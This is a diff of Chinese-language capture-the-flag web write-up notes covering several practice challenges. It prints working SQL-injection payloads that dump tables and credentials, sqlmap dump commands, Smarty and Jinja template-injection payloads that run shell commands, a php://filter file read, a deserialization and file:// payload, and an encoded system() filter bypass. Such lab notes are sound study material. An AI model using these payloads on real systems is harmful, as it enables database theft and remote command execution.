@@ -61,14 +61,19 @@
 [BUUCTF [强网杯 2019]随便注 1（两种方法）-CSDN博客](https://blog.csdn.net/m0_62879498/article/details/123292860)
 
 给出的答案如下：
+
 ```
 -1';use supersqli;set @sql=concat('s','elect flag from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1-- q
 ```
+
 通过自己尝试仿照答案实现的注入如下：
+
 ```
 1';use supersqli;set @tmp=concat('s','elect flag from `1919810931114514`');PREPARE temp from @tmp;EXECUTE temp ;
 ```
+
 或是通过修改表名的操作实现：
+
 ```
 1';rename table words to word2;rename table `1919810931114514` to words;
 
@@ -76,6 +81,7 @@ ALTER TABLE words ADD id int(10) DEFAULT '12';
 
 ALTER TABLE words CHANGE flag data VARCHAR(100);-- q
 ```
+
 然后通过构造1' or 1=1;实现
 
 ### 总结：
@@ -101,14 +107,19 @@ ALTER TABLE words CHANGE flag data VARCHAR(100);-- q
 [[极客大挑战 2019]LoveSQL 1-CSDN博客](https://blog.csdn.net/satasun/article/details/106246493)
 
 username=admin' order by 4%23&password=1通过盲注可知没有第四列，即只有三列
+
 ```
 /check.php?username=1' union select 1,2,3%23&password=1
 ```
+
 通过下面的union查询测试回显点位，得到可进行操作的点位为2和3，因此，通过下面的语句查询数据库和版本：
+
 ```
 /check.php?username=1' union select 1,database(),version()%23&password=1
 ```
+
 通过这个语句获取当前所在的数据库中的表有哪些：
+
 ```
 /check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
 ```
@@ -118,6 +129,7 @@ username=admin' order by 4%23&password=1通过盲注可知没有第四列，即�
 ```
 /check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
 ```
+
 进一步查询指定的表中的列有哪些：
 
 ```
@@ -128,6 +140,7 @@ username=admin' order by 4%23&password=1通过盲注可知没有第四列，即�
 可见在l0ve1ysq1这个表中有如上三个字段
 
 最后查询字段的内容：
+
 ```
 /check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
 ```
@@ -152,6 +165,14 @@ username=admin' order by 4%23&password=1通过盲注可知没有第四列，即�
 
 ![alt text](img/secret-flag-php.jpg)
 需要使用filter协议过滤
+
+例如：
+
+```php
+$file=php://filter/convert.base64-encode/resource=/flag
+```
+
+可以直接查看 flag 文件的内容
 
 ![alt text](./img/secret-filter协议.jpg)
 
@@ -394,7 +415,7 @@ https://www.nssctf.cn/problem/3727
 
 ![1740652072380](img/middlevel原始页面.jpg)
 
-由最下方的信息可知这里使用`Smarty`模板引擎，通过给出的AIP地址，发现无法访问，但是在这个页面中，右上角又显示出了我们电脑的IP地址
+由最下方的信息可知这里使用 `Smarty`模板引擎，通过给出的AIP地址，发现无法访问，但是在这个页面中，右上角又显示出了我们电脑的IP地址
 
 可以猜测用到的是 `XFF`，在 `Yakit`中进行测试，修改XFF标签的内容
 
@@ -404,7 +425,7 @@ https://www.nssctf.cn/problem/3727
 
 ![1740653665480](img/middlevel可行性测试.jpg)
 
-进一步确认的之前的猜想，这里存在`SSTI`，接下来猜测应该需要通过这个漏洞去执行 `shell`命令，获取系统中的flag文件
+进一步确认的之前的猜想，这里存在 `SSTI`，接下来猜测应该需要通过这个漏洞去执行 `shell`命令，获取系统中的flag文件
 
 在PHP中，直接执行 `shell`命令可以使用下面的代码结构：
 
@@ -424,7 +445,7 @@ system('cmd')
 
 ![1740654251349](img/midlevel得到flag.jpg)
 
-还有一种方法利用的是`Smarty`的`{if}`标签，`{if}`标签可以在里面执行`php`代码，所以也可以将`XFF`的内容替换为下面的：
+还有一种方法利用的是 `Smarty`的 `{if}`标签，`{if}`标签可以在里面执行 `php`代码，所以也可以将 `XFF`的内容替换为下面的：
 
 ```php
 {if system('cat /flag')}{/if}
@@ -445,24 +466,28 @@ https://www.nssctf.cn/problem/259
 * 考点：SSTI,Flask,Jinja2
 * 工具：
 
-进入容器网页后通过浏览器的F12可一发现使用的请求方式为`POST`，并且字段名称为`name`，由此，可以使用`fenjing`去直接进行绕过wap，执行指令找到flag
+进入容器网页后通过浏览器的F12可一发现使用的请求方式为 `POST`，并且字段名称为 `name`，由此，可以使用 `fenjing`去直接进行绕过wap，执行指令找到flag
 
 一开始执行
+
 ```bash
 cat /flag
 ```
-发现没有结果，猜测flag应该不在根目录，于是`ls`查看根目录情况:
+
+发现没有结果，猜测flag应该不在根目录，于是 `ls`查看根目录情况:
+
 ```bash
 ls /
 ```
 
 ![](./img/fenjing1.png)
 
-发现一个`flag_1s_Hrea`的文件，打开查看后是告诉我们flag在环境变量中，于是继续执行下面的命令得到flag
+发现一个 `flag_1s_Hrea`的文件，打开查看后是告诉我们flag在环境变量中，于是继续执行下面的命令得到flag
 
 ```bash
 printenv
 ```
+
 ![](./img/fenjing2.png)
 
 ---
@@ -474,14 +499,16 @@ https://www.nssctf.cn/problem/387
 * 考点：sql注入
 * 工具：sqlmap
 
-进入题目的网页后可以发现网页标题已经告诉了你注入的参数是`wllm`，所以接下来可以直接使用`sqlmap`扫描尝试注入
+进入题目的网页后可以发现网页标题已经告诉了你注入的参数是 `wllm`，所以接下来可以直接使用 `sqlmap`扫描尝试注入
+
 ```shell
 python .\sqlmap.py -u http://node7.anna.nssctf.cn:29274/index.php?wllm=1
 ```
 
 ![](./img/easysql_sqlmap扫描结果.png)
 
-根据扫描结果可知存在`bool盲注`，直接使用--dump参数查看数据库内容
+根据扫描结果可知存在 `bool盲注`，直接使用--dump参数查看数据库内容
+
 ```shell
 python .\sqlmap.py -u http://node7.anna.nssctf.cn:29274/index.php?wllm=1 --dump
 ```
@@ -491,6 +518,7 @@ python .\sqlmap.py -u http://node7.anna.nssctf.cn:29274/index.php?wllm=1 --dump
 ---
 
 ## [SWPUCTF 2021 新生赛]jicao
+
 * 考点：PHP审计，请求头
 * 工具：python
 
@@ -506,7 +534,9 @@ if ($id=="wllmNB"&&$json['x']=="wllm")
 {echo $flag;}
 ?>
 ```
-其中代码要求上传的请求包中含有和`POST`匹配的的`id=="wllmNB"`以及和`GET`匹配的`json['x']=="wllm"`,构建下面的python代码即可：
+
+其中代码要求上传的请求包中含有和 `POST`匹配的的 `id=="wllmNB"`以及和 `GET`匹配的 `json['x']=="wllm"`,构建下面的python代码即可：
+
 ```python
 import requests
 
@@ -517,6 +547,7 @@ data = {"id": "wllmNB"}  # 传递 POST 参数
 response = requests.post(url, params=params, data=data)
 print(response.text)  # 期待返回 flag
 ```
+
 ## [FSCTF 2023]加速加速
 
 https://www.nssctf.cn/problem/4629
@@ -536,7 +567,7 @@ post中替换请求体为：
 
 通过yakit多线程上传10000次，然后另开一个fuzz进行多个get请求获取上传的php去执行
 
-然后在网页端对cmd变量进行操作，`ls` 查询到 flag 是在根目录下，直接`cat`获取
+然后在网页端对cmd变量进行操作，`ls` 查询到 flag 是在根目录下，直接 `cat`获取
 
 ![](./img/加速加速竞争获取flag.png)
 
@@ -548,14 +579,12 @@ https://www.nssctf.cn/problem/20
 
 * 考点：sql注入
 
-
-
-
 sql注入考点：
 
 `order by ` 注入 获取数据库查询的列数
 
 联合查询注入
+
 ```
 SELECT * FROM some_table WHERE no = 0
 UNION
@@ -563,6 +592,7 @@ SELECT 1, GROUP_CONCAT(table_name), 3, 4
 FROM information_schema.tables
 WHERE table_schema = database();
 ```
+
 该查询可以用来获得当前使用的数据库中的表都有哪些，`table_schema`表示当前查询的表所属的数据库的名称，`information_schema.tables`包含了数据库中的所有表的信息，`database()`会返回当前使用的数据库的名称，`GROUP_CONCAT(table_name)`会返回当前数据库中所有表的名称，以逗号分隔
 
 ```
@@ -572,19 +602,22 @@ SELECT 1, GROUP_CONCAT(column_name), 3, 4
 FROM information_schema.columns
 WHERE table_schema = database() AND table_name = 'users';
 ```
+
 和前面的一样，在已经知道表名的基础上进一步查询该表中的列名
 
 ```php
 function get($url)
 ```
-一种SSRF攻击的例子，攻击者可以提交`url`来让服务器去访问其本身的内容（外部无权访问的内容）
+
+一种SSRF攻击的例子，攻击者可以提交 `url`来让服务器去访问其本身的内容（外部无权访问的内容）
+
 ```
 file://
 ```
+
 为协议可以用于访问文件的内容
 
-
-因此可以根据这些技巧去尝试，首先在各个页面来回点击和查看的过程中已经发现了`view.php?no=0`为可注入点，通过`sqlmap`扫描无果后决定采用盲注去获取更多的信息
+因此可以根据这些技巧去尝试，首先在各个页面来回点击和查看的过程中已经发现了 `view.php?no=0`为可注入点，通过 `sqlmap`扫描无果后决定采用盲注去获取更多的信息
 
 在进行联合查询的过程中，发现其列最多有 4 列，也就证明联合查询注入是可行的，由此，进一步构建 payload 得到当前所使用的数据库的表名和列名
 
@@ -592,7 +625,7 @@ file://
 
 ![](./img/fakebook_查询列名.png)
 
-然后通过之前检查`robots.txt`的内容得到了一个 php 源码文件，通过代码审计发现是一个关于反序列化的题目，而且根据经验可以猜测 flag 就在网页的根目录下，于是最后构建了下面的 payload 进行最后的注入攻击的
+然后通过之前检查 `robots.txt`的内容得到了一个 php 源码文件，通过代码审计发现是一个关于反序列化的题目，而且根据经验可以猜测 flag 就在网页的根目录下，于是最后构建了下面的 payload 进行最后的注入攻击的
 
 ```
 view.php?no=1%20union/**/select%20%201,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
@@ -625,11 +658,11 @@ https://www.nssctf.cn/problem/3429
 
 ![](/img/nodejs-获取flag.png)
 
-
 补充：数组比较可以绕过强制转小写操作，可将下面的内容作为 post 的请求体发送：
+
 ```
 {
-				
+			
 	     		"checkcode":["a",
 "G",
 "r",
@@ -650,12 +683,14 @@ https://www.nssctf.cn/problem/3429
 }
 
 ```
+
 ---
+
 ## [NCTF 2018]全球最大交友网站
 
 https://www.nssctf.cn/problem/961
 
-* 考点：.git泄露 
+* 考点：.git泄露
 * 工具：git
 
 进入网页发现可以访问文件目录，下载 zip 解压后是一个 .git 文件夹，在终端中使用 git 命令可以查看其具体信息：
@@ -697,11 +732,9 @@ https://www.nssctf.cn/problem/439
 
 这里采用的方法是用urlencode函数进行编码然后再取反，因为没有过滤 `()` 所以可以借助这一点来构建函数 e.g. system(ls /)
 
->提交的 GET 参数实际上是经过 URL 编码的，这样即使编码串中包含字母，也是在表示一个字节（例如 %8C 表示 0x8C），而不是直接的字母字符
-当 PHP 接收到参数时，会先进行 URL 解码，恢复成原始的字节序列（例如 0x8C, 0x86, …），这时这些字节不属于常规的 ASCII 字母范围
-因此，严格过滤字母的正则判断是在对解码后的数据检查，结果不会因为 URL 编码后的 A–F 而被触发过滤
-
-
+> 提交的 GET 参数实际上是经过 URL 编码的，这样即使编码串中包含字母，也是在表示一个字节（例如 %8C 表示 0x8C），而不是直接的字母字符
+> 当 PHP 接收到参数时，会先进行 URL 解码，恢复成原始的字节序列（例如 0x8C, 0x86, …），这时这些字节不属于常规的 ASCII 字母范围
+> 因此，严格过滤字母的正则判断是在对解码后的数据检查，结果不会因为 URL 编码后的 A–F 而被触发过滤
 
 所以可以使用下面的代码去实现这个操作：
 
@@ -716,12 +749,48 @@ print("\n");
 echo urlencode(~$b);
 ?>
 ```
+
 得到编码取反的结果后再进行包装取反构建 payload 即可
+
 ```
 ?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0)
- ```
+```
 
- >这里写成 (~%8C%86%8C%8B%9A%92)，括号只是将按位取反的结果封装成一个表达式。这个表达式的计算结果是字符串 "system"，但括号本身不是字符串的一部分，而是语法的一部分。
-紧跟着的那一对括号 (~%9C%9E%8B%DF%D0%99%D5) 用来提供参数。PHP 允许通过变量函数调用，即如果一个表达式返回一个函数名（字符串），那么紧跟着的括号会被解释为函数调用
+> 这里写成 (~%8C%86%8C%8B%9A%92)，括号只是将按位取反的结果封装成一个表达式。这个表达式的计算结果是字符串 "system"，但括号本身不是字符串的一部分，而是语法的一部分。
+> 紧跟着的那一对括号 (~%9C%9E%8B%DF%D0%99%D5) 用来提供参数。PHP 允许通过变量函数调用，即如果一个表达式返回一个函数名（字符串），那么紧跟着的括号会被解释为函数调用
 
 ---
+
+## [NSSCTF 2022 Spring Recruit]ezgame
+
+* 考点：js分析，源码泄露，信息收集
+* 工具：浏览器
+  通过检查网页源码可以发现，提示我们通过获取分数超过 65 来得到 flag ，于是想到通过嵌入 js 代码实现。
+  同时，可以发现，网页使用的 js 代码可以直接被访问查看，通过查看源码可以直接发现标记score 的变量名称为：`scorePoint`，所以构建了一个 button 组件在网页中，当去点击这个按钮时，就会执行其中的 js 代码，实现变量赋值，最后再执行最后的回显，得到 flag：
+
+![](./img/rabbit%20hunu_注入点击.png)
+
+---
+
+## [AFCTF 2021]BABY_CSP
+
+* 考点： XSS,CSP,反射型XSS
+* 工具：浏览器
+
+这里使了 CSP 的 nonce：
+
+通过查看响应的内容可以发现，其中的 nonce 是：
+
+通过将这个 nonce 的值添加进 script 标签中使得标签能够正常执行，然后使用 `alert` 标签实现 flag 变量的的输出:
+(但是怎么知道flag这个变量的存在的？)
+
+![](./img/babycsp.png)
+
+CSP 相关：
+
+[使用CSP防止XSS攻击 - 汕大小吴 - 博客园](https://www.cnblogs.com/wuguanglin/p/XSS.html)
+
+---
+
+
+
